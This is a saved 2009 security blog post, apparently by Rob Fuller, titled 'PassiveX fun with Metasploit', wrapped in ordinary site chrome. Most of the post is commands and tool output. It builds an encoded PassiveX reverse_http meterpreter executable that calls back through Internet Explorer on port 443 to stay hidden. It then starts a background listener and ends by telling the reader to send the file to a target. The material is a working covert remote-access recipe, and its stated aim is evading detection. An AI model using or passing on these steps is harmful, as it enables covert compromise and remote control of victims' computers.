@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>PassiveX fun with Metasploit - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="PassiveX fun with Metasploit" />
+<meta property="og:description" content="I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload.
+A really down and dirty explination of what PassiveX is and why it&rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2009-06-10T13:21:05+00:00" />
+<meta property="article:modified_time" content="2009-06-10T13:21:05+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PassiveX fun with Metasploit"/>
+<meta name="twitter:description" content="I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload.
+A really down and dirty explination of what PassiveX is and why it&rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" /><link rel="prev" href="https://malicious.link/posts/2009/2009-05-29-getting-your-fill-of-security/" /><link rel="next" href="https://malicious.link/posts/2009/2009-06-11-rant-back-valsmith/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PassiveX fun with Metasploit",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2009\/2009-06-10-passivex-fun-with-metasploit\/"
+        },"genre": "posts","wordcount":  644 ,
+        "url": "https:\/\/malicious.link\/posts\/2009\/2009-06-10-passivex-fun-with-metasploit\/","datePublished": "2009-06-10T13:21:05+00:00","dateModified": "2009-06-10T13:21:05+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PassiveX fun with Metasploit</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/metasploit/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>metasploit</a>&nbsp;<a href="/categories/passivex/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>passivex</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2009-06-10">2009-06-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;644 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the <a href="/archives/440-metasploit-2.html" rel="">IExpress “hack”</a> would make for an very hard to spot payload.</p>
+<p>A really down and dirty explination of what PassiveX is and why it&rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).</p>
+<p>(props to skape for writting PassiveX and @<a href="https://twitter.com/natronkeltner" target="_blank" rel="noopener noreffer ">NatronKeltner</a> for kicking in the latest tweaks to make it work with IE7/IE8)</p>
+<p>Here are the options for msfpayload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Usage: ./msfpayload &lt;payload&gt; [var=val] &lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And msfencode&rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./msfencode -h
+</span></span><span class="line"><span class="cl">Usage: ./msfencode &lt;options&gt;
+</span></span><span class="line"><span class="cl">OPTIONS:
+</span></span><span class="line"><span class="cl">-a &lt;opt&gt; The architecture to encode as     
+</span></span><span class="line"><span class="cl">-b &lt;opt&gt; The list of characters to avoid: &#39;x00xff&#39;      
+</span></span><span class="line"><span class="cl">-c &lt;opt&gt; The number of times to encode the data      
+</span></span><span class="line"><span class="cl">-e &lt;opt&gt; The encoder to use      
+</span></span><span class="line"><span class="cl">-h Help banner      
+</span></span><span class="line"><span class="cl">-i &lt;opt&gt; Encode the contents of the supplied file path      
+</span></span><span class="line"><span class="cl">-l List available encoders      
+</span></span><span class="line"><span class="cl">-m &lt;opt&gt; Specifies an additional module search path      
+</span></span><span class="line"><span class="cl">-n Dump encoder information      
+</span></span><span class="line"><span class="cl">-o &lt;opt&gt; The output file      
+</span></span><span class="line"><span class="cl">-s &lt;opt&gt; The maximum size of the encoded data      
+</span></span><span class="line"><span class="cl">-t &lt;opt&gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe
+</span></span><span class="line"><span class="cl">[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have our &ldquo;malicious payload&rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./msfconsole
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">_     
+</span></span><span class="line"><span class="cl">| | o      
+</span></span><span class="line"><span class="cl">_ _ _ _ _|_ __, , _ | | __ _|_      
+</span></span><span class="line"><span class="cl">/ |/ |/ | |/ | / | / _|/ _|/ / _| |      
+</span></span><span class="line"><span class="cl">| | |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/      
+</span></span><span class="line"><span class="cl">/|      
+</span></span><span class="line"><span class="cl">|
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=[ msf v3.3-dev     
+</span></span><span class="line"><span class="cl">+ -- --=[ 376 exploits - 234 payloads      
+</span></span><span class="line"><span class="cl">+ -- --=[ 20 encoders - 7 nops      
+</span></span><span class="line"><span class="cl">=[ 153 aux
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf &gt; use multi/handler     
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; exploit -h
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>(I&rsquo;m showing you &rsquo;exploit&rsquo;s options because a lot of people don&rsquo;t know they exist. With two lines you can start your listener (use, then exploit):**</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Usage: exploit [options]     
+</span></span><span class="line"><span class="cl">Launches an exploitation attempt.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OPTIONS:     
+</span></span><span class="line"><span class="cl">-e &lt;opt&gt; The payload encoder to use. If none is specified, ENCODER is used.      
+</span></span><span class="line"><span class="cl">-h Help banner.      
+</span></span><span class="line"><span class="cl">-j Run in the context of a job.      
+</span></span><span class="line"><span class="cl">-n &lt;opt&gt; The NOP generator to use. If none is specified, NOP is used.      
+</span></span><span class="line"><span class="cl">-o &lt;opt&gt; A comma separated list of options in VAR=VAL format.      
+</span></span><span class="line"><span class="cl">-p &lt;opt&gt; The payload to use. If none is specified, PAYLOAD is used.      
+</span></span><span class="line"><span class="cl">-t &lt;opt&gt; The target index to use. If none is specified, TARGET is used.      
+</span></span><span class="line"><span class="cl">-z Do not interact with the session after successful exploitation.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Exploit running as background job.     
+</span></span><span class="line"><span class="cl">[*] PassiveX listener started.      
+</span></span><span class="line"><span class="cl">[*] Starting the payload handler...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> msf exploit(handler) &gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&rsquo;re set.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2009-06-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" data-title="PassiveX fun with Metasploit" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" data-title="PassiveX fun with Metasploit"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" data-title="PassiveX fun with Metasploit"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" data-title="PassiveX fun with Metasploit"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2009/2009-06-10-passivex-fun-with-metasploit/" data-title="PassiveX fun with Metasploit"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2009/2009-05-29-getting-your-fill-of-security/" class="prev" rel="prev" title="Getting your fill of Security"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Getting your fill of Security</a>
+            <a href="/posts/2009/2009-06-11-rant-back-valsmith/" class="next" rel="next" title="Rant Back – ValSmith">Rant Back – ValSmith<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
